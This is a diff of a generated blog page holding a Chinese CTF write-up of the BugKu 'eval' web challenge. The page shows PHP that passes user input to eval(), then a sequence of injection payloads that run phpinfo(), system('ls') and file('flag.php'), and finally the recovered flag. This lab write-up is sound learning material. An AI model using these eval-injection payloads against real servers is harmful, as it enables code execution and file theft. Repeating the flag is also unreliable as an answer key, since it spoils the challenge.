@@ -799,7 +799,7 @@ mjx-container[display="true"] + br {
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>281 字</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>267 字</span>
         </span>
     
     
@@ -823,64 +823,34 @@ mjx-container[display="true"] + br {
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="BugKu-WEB-eval"><a href="#BugKu-WEB-eval" class="headerlink" title="BugKu-WEB-eval"></a>BugKu-WEB-eval</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../img-posts/2025-09-02-BugKu-WEB-eval/%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0.png"
-                      alt="Question"
-                ><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../img-posts/2025-09-02-BugKu-WEB-eval/%E9%A2%98%E7%9B%AE%E7%BD%91%E9%A1%B5.png"
-                      alt="Question"
-                ></p>
+			<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="BugKu-WEB-eval"><a href="#BugKu-WEB-eval" class="headerlink" title="BugKu-WEB-eval"></a>BugKu-WEB-eval</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img lazyload="" src="/images/loading.svg" data-src="/../img-posts/2025-09-02-BugKu-WEB-eval/%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0.png" alt="Question"><br><img lazyload="" src="/images/loading.svg" data-src="/../img-posts/2025-09-02-BugKu-WEB-eval/%E9%A2%98%E7%9B%AE%E7%BD%91%E9%A1%B5.png" alt="Question"></p>
 <h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><blockquote>
-<p>注：看到一位评论区的大佬，讲得超级详细，也解决了我很多做题的时候的疑问：<a class="link"   target="_blank" rel="noopener" href="https://www.yuque.com/u21437924/ap9vtm/gqkc3dcfmfpe5p85?singleDoc#fYY9d" >链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>注：看到一位评论区的大佬，讲得超级详细，也解决了我很多做题的时候的疑问：<a class="link" target="_blank" rel="noopener" href="https://www.yuque.com/u21437924/ap9vtm/gqkc3dcfmfpe5p85?singleDoc#fYY9d">链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 </blockquote>
 <p>打开靶机可以看到php代码</p>
-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">'hello'</span>];</span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">"var_dump(<span class="subst">$a</span>);"</span>);</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>
 
 <p>代码审计可以发现这个是一个<code>eval()</code>的注入题<br>直接在链接后面加入下列参数，看看成不成功，发现可以执行代码</p>
 <blockquote>
-<p>注：)为了和前面的括号拼在一起组成一条命令，也就是var_dump(1)，然后再街上后面的命令phpinfo()，&#x2F;&#x2F;用来注释掉后面的括号</p>
+<p>注：)为了和前面的括号拼在一起组成一条命令，也就是var_dump(1)，然后再街上后面的命令phpinfo()，//用来注释掉后面的括号</p>
 </blockquote>
 <div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=1);phpinfo();//</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../img-posts/2025-09-02-BugKu-WEB-eval/phpinfo.png"
-                      alt="Question"
-                ></p>
+<p><img lazyload="" src="/images/loading.svg" data-src="/../img-posts/2025-09-02-BugKu-WEB-eval/phpinfo.png" alt="Question"></p>
 <p>那我们直接找出flag的变量，但是不太行，出题者猜到了我们想干什么</p>
 <div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=1);var_dump($flag);//</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../img-posts/2025-09-02-BugKu-WEB-eval/flag1.png"
-                      alt="Question"
-                ></p>
+<p><img lazyload="" src="/images/loading.svg" data-src="/../img-posts/2025-09-02-BugKu-WEB-eval/flag1.png" alt="Question"></p>
 <p>再试试超级全局变量GLOBALS</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../img-posts/2025-09-02-BugKu-WEB-eval/gob.png"
-                      alt="Question"
-                ></p>
+<p><img lazyload="" src="/images/loading.svg" data-src="/../img-posts/2025-09-02-BugKu-WEB-eval/gob.png" alt="Question"></p>
 <p>使用ls看看看看有什么文件吧</p>
-<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=1);system(&#x27;ls&#x27;);//</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=1);system('ls');//</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../img-posts/2025-09-02-BugKu-WEB-eval/ls.png"
-                      alt="Question"
-                ></p>
+<p><img lazyload="" src="/images/loading.svg" data-src="/../img-posts/2025-09-02-BugKu-WEB-eval/ls.png" alt="Question"></p>
 <p>发现有<em>flag.php</em>文件，用cat查看，发现不太行，查资料后发现可以使用<code>file()</code>函数查看文件(忘截图了)</p>
-<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=1);file(&#x27;flag.php&#x27;);//</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hello=1);file('flag.php');//</span><br></pre></td></tr></table></figure></div>
 
-<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;327d120419841b15b254a31217aa3f00&#125;</span><br></pre></td></tr></table></figure></div>
+<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{327d120419841b15b254a31217aa3f00}</span><br></pre></td></tr></table></figure></div>
 
 		</div>
 
@@ -1054,7 +1024,7 @@ mjx-container[display="true"] + br {
               <span>2025</span>
               -
             
-            2025&nbsp;&nbsp;<i class="fa-duotone fa-solid fa-display-code"></i>&nbsp;&nbsp;<a href="/">Mel0ny</a>
+            2026&nbsp;&nbsp;<i class="fa-duotone fa-solid fa-display-code"></i>&nbsp;&nbsp;<a href="/">Mel0ny</a>
             
                 
                 <p class="post-count space-x-0.5">
@@ -1063,7 +1033,7 @@ mjx-container[display="true"] + br {
                     </span>
                     
                         <span>
-                            共 26.4k 字
+                            共 25.6k 字
                         </span>
                     
                 </p>
